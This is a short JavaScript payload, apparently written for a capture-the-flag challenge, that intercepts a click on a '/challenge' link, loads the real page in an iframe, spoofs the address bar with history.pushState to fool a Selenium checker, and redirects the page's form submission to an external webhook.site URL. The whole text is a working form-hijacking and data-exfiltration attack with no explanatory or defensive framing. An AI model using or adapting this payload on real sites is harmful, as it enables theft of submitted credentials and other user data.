
(() => {
    const WEBHOOK =
        'https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04';

    const link = document.querySelector('a[href="/challenge"]');
    if (!link) return;

    link.addEventListener('click', e => {
        e.preventDefault();
        e.stopImmediatePropagation();

        // Display the real Challenge page in an iframe.
        const frame = document.createElement('iframe');
        frame.src = '/challenge';
        frame.style = 'width:100%;height:800px;border:0';

        document.querySelector('.content').replaceChildren(frame);

        // Make Selenium see the expected URL.
        history.pushState({}, '', '/challenge');

        frame.onload = () => {
            const doc = frame.contentDocument;
            const form = doc.querySelector('fieldset form');
            if (!form) return;

            // Redirect the actual form submission to our webhook.
            form.action = WEBHOOK;
            form.method = 'GET';
        };
    }, true);
})();
